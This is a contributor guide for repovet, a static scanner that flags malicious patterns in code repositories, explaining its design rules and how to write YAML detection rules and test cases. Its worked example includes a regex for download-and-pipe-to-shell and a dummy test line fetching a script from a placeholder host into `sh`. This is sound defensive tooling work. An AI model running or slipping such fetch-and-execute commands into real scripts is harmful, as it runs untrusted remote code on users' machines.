# Contributing to repovet

Thanks for helping. The most useful contributions are reports of false positives and
missed detections, and new or narrower rules. Please read this page first; it is short.

## Design principles

These hold for every change; a pull request that breaks one will not be merged.

- **Static analysis only.** repovet reads files and Git objects. It never executes,
  imports, builds or installs anything from a checked repository: no scripts, hooks,
  package managers, `git` binary, filters or LFS, not even "just to test".
- **No risk score, no verdict.** There is no overall score and no "safe" or "unsafe".
  The report lists findings, and "no findings" is never worded as "safe".
- **Every finding is explained.** Each has a rule ID, a severity, a confidence, the file
  and line where that applies, why it matters and what to do.
- **An honest "Not checked" list.** Files that were skipped or could not be parsed,
  steps that were switched off and ecosystems that are not supported are listed in
  every report.
- **Minimal dependencies.** At runtime only PyYAML and dulwich; everything else is the
  Python standard library.
- **Network only where documented, and switchable off.** The local analysis is offline.
  Network access happens only to clone a URL you name and, as a separate step, to ask the
  GitHub API; `--offline` turns the API off. An optional token is read from the
  environment and never printed.
- **Measured, not claimed.** What repovet detects is checked against reconstructions of
  documented attacks (`tests/reconstructions/`), and false alarms against popular
  repositories (`docs/fp-benchmark.md`); known gaps stay written down.

## Ground rules

- **repovet never runs anything from a checked repository.** No `subprocess`, no
  `eval`/`exec`, no imports of repository code, no `git` binary, no package managers.
  Python files are read with `ast.parse` only. `ruff` (banned APIs, bandit) and
  `tests/test_self_check.py` enforce this; please do not work around them.
- **Few false positives beat many rules.** When in doubt, make a rule narrower, lower
  its severity or confidence, or leave it out.
- **No "safe" verdicts.** Reports never say that a repository is safe, clean or secure;
  provenance hints ("AI-generated") are indicators, worded with "indicator" or "may".
- **Harmless test data only.** "Malicious" examples are dummies: placeholder domains
  (`example.invalid`), dummy payloads, nothing that works. They are never run.
- Runtime dependencies stay PyYAML and dulwich. A new dependency needs a strong reason.
- Code, comments, CLI help, rule texts and reports are in English.

## Development setup

You need [uv](https://docs.astral.sh/uv/). Then:

```
uv sync
uv run pytest
uv run mypy src tests scripts
uv run ruff check
uv run ruff format --check
```

All four must pass before a pull request is merged. Tests never use the network.

## Reporting a false positive or a missed detection

Use the issue forms ("False positive" or "Missed detection"). Include the repovet
version (`repovet --version`), the command you ran, the rule ID and a **small, harmless
example** that reproduces it. Do not paste real malware, real secrets or private code.

## Adding a rule

Rules are YAML data in `src/repovet/rules/`, one file per area (`autorun.yaml`,
`agents.yaml`, `obfuscation.yaml`, `download_exec.yaml`, `binaries.yaml`,
`dependencies.yaml`, `provenance.yaml`, `trust.yaml`). A new rule of an existing check
type needs no code change.

1. **Pick the next free ID** of the area: `RC-<AREA>-<NNN>`, for example `RC-DLX-007`.
   IDs are never renamed or reused; a rule that is no longer wanted gets
   `deprecated: true`.
2. **Write the rule.** Required fields: `id`, `title`, `area`, `severity`, `confidence`,
   `check`, `message`, `rationale`, `recommendation`. Optional: `files`, `exclude`,
   `references`, `tags`, `platforms`, `case_sensitive`, `deprecated`.

   ```yaml
   - id: RC-DLX-007
     title: Script downloads code with a made-up tool
     area: download_exec
     severity: medium
     confidence: medium
     files: [{set: script_files}]
     exclude: [{set: vendored}, {set: test_files}]
     check:
       type: regex
       ignore: "{{comment_line}}"
       prefilter: [fetchtool]
       pattern: '\bfetchtool[ \t]+https?://[^\s|]+[ \t]*\|[ \t]*sh\b'
     message: "Downloads and runs code: {match}"
     rationale: >
       Explain in one or two sentences why this matters and when it is legitimate.
     recommendation: >
       Tell the reader what to do instead.
     references:
       - https://attack.mitre.org/techniques/T1105/
   ```

   - Check types: `filename`, `regex`, `keypath`, `unicode`, `python_ast`,
     `import_ref`, `blob`, `magic`, `tree`, `dependency`, `metric`. Their parameters
     are described at the top of each module in `src/repovet/engine/checks/`.
   - Shared regex building blocks (`{{network_fetch}}`, `{{shell_pipe_exec}}`, ...)
     live in `_patterns.yaml`, shared file lists (`{set: script_files}`, ...) in
     `_filesets.yaml`.
   - Message placeholders: `{path}`, `{line}`, `{match}`, `{key}`, `{value}`,
     `{decoded}`, `{count}`, `{chars}`. Leave `{path}` out of the message when the same
     finding can occur in many files: the text report groups findings with the same
     rule and message.
   - Every regex must stay fast on hostile input (no nested quantifiers such as
     `(a+)+`); `tests/test_redos.py` checks each one with a time limit.
3. **Add rule cases** to `tests/rule_cases/<area>.yaml`: at least one `positive` case
   (the rule fires, `expect` names the file and line) and one harmless `negative` case
   (the rule must not fire), ideally the near miss you worried about:

   ```yaml
   RC-DLX-007:
     positive:
       - name: fetchtool piped into a shell
         files:
           install.sh: |
             fetchtool https://example.invalid/i.sh | sh
         expect: [{path: install.sh, line: 1}]
     negative:
       - name: fetchtool saves to a file
         files:
           install.sh: |
             fetchtool https://example.invalid/data.json > data.json
   ```

   Files are created only under a temporary folder during the test. Write invisible
   or control characters as escapes (`"\u202E"`), never raw, and do not add real
   file names that tools act on (no real `.vscode/tasks.json` or `setup.py` in the
   repository; put them inline in the rule case). `expect` may also check
   `confidence`.
4. **Regenerate the rule list:** `uv run repovet rules list --markdown` and paste the
   tables between the markers in `RULES.md` (a test checks it).
5. Run the four checks above.

## Pull requests

Keep a pull request to one topic, describe what changed and why, and fill in the
checklist of the template. Thank you!
